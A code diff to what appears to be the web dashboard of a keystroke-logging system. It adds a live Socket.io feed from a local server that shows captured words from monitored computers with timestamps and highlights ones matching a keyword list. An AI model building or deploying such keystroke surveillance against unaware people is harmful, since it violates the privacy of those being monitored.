@@ -24,6 +24,44 @@ const endTimeInput = document.getElementById('end-time-input');
 
 let currentComputer = null;
 
+// Socket.io connection
+const socket = io('http://127.0.0.1:8000');
+
+// Socket.io event listener
+socket.on('new_keystrokes', async (data) => {
+    // Only update if the user is currently viewing the correct computer's log
+    if (currentComputer && data.comp_id === currentComputer.id) {
+        // Append the new words to the existing log
+        const wordsLogContainer = document.getElementById('word-log');
+        const keywords = await fetchKeywords(); // Fetch keywords for highlighting
+
+        data.words.forEach(item => {
+            const wordTag = document.createElement('div');
+            wordTag.classList.add('word-tag');
+            
+            if (keywords.includes(item.key.toLowerCase())) {
+                wordTag.classList.add('highlight');
+            }
+            
+            const keyElement = document.createElement('span');
+            keyElement.classList.add('keystroke-key', 'keystroke-word');
+            keyElement.textContent = item.key;
+            
+            const timestampElement = document.createElement('span');
+            timestampElement.classList.add('keystroke-timestamp');
+            const keystrokeDate = new Date(item.timestamp);
+            timestampElement.textContent = keystrokeDate.toLocaleString();
+            
+            wordTag.appendChild(keyElement);
+            wordTag.appendChild(timestampElement);
+            wordsLogContainer.appendChild(wordTag);
+        });
+
+        // Update the total keystrokes display
+        totalKeystrokesDisplay.textContent = parseInt(totalKeystrokesDisplay.textContent) + data.words.length;
+    }
+});
+
 loginForm.addEventListener('submit', async (event) => {
     event.preventDefault();
     const username = document.getElementById('username').value;
@@ -242,7 +280,7 @@ async function showViewer(computer) {
     
     document.getElementById('word-log').innerHTML = '';
     
-    renderWords(wordsLog);
+    await renderWords(wordsLog);
     
     const lastConnectedDisplay = document.getElementById('last-connected');
     lastConnectedDisplay.textContent = new Date().toLocaleString();
@@ -383,34 +421,33 @@ function showRenameInput(card, currentName) {
     });
 }
 
-function renderWords(wordsToRender) {
+async function renderWords(wordsToRender) {
     const wordLogContainer = document.getElementById('word-log');
     if (!wordLogContainer) return;
 
     wordLogContainer.innerHTML = '';
 
-    fetchKeywords().then(keywords => {
-        wordsToRender.forEach(item => {
-            const wordTag = document.createElement('div');
-            wordTag.classList.add('word-tag');
-            
-            if (keywords.includes(item.key.toLowerCase())) {
-                wordTag.classList.add('highlight');
-            }
-            
-            const keyElement = document.createElement('span');
-            keyElement.classList.add('keystroke-key', 'keystroke-word');
-            keyElement.textContent = item.key;
-            
-            const timestampElement = document.createElement('span');
-            timestampElement.classList.add('keystroke-timestamp');
-            const keystrokeDate = new Date(item.timestamp);
-            timestampElement.textContent = keystrokeDate.toLocaleString();
-            
-            wordTag.appendChild(keyElement);
-            wordTag.appendChild(timestampElement);
-            wordLogContainer.appendChild(wordTag);
-        });
+    const keywords = await fetchKeywords();
+    wordsToRender.forEach(item => {
+        const wordTag = document.createElement('div');
+        wordTag.classList.add('word-tag');
+        
+        if (keywords.includes(item.key.toLowerCase())) {
+            wordTag.classList.add('highlight');
+        }
+        
+        const keyElement = document.createElement('span');
+        keyElement.classList.add('keystroke-key', 'keystroke-word');
+        keyElement.textContent = item.key;
+        
+        const timestampElement = document.createElement('span');
+        timestampElement.classList.add('keystroke-timestamp');
+        const keystrokeDate = new Date(item.timestamp);
+        timestampElement.textContent = keystrokeDate.toLocaleString();
+        
+        wordTag.appendChild(keyElement);
+        wordTag.appendChild(timestampElement);
+        wordLogContainer.appendChild(wordTag);
     });
 }
 
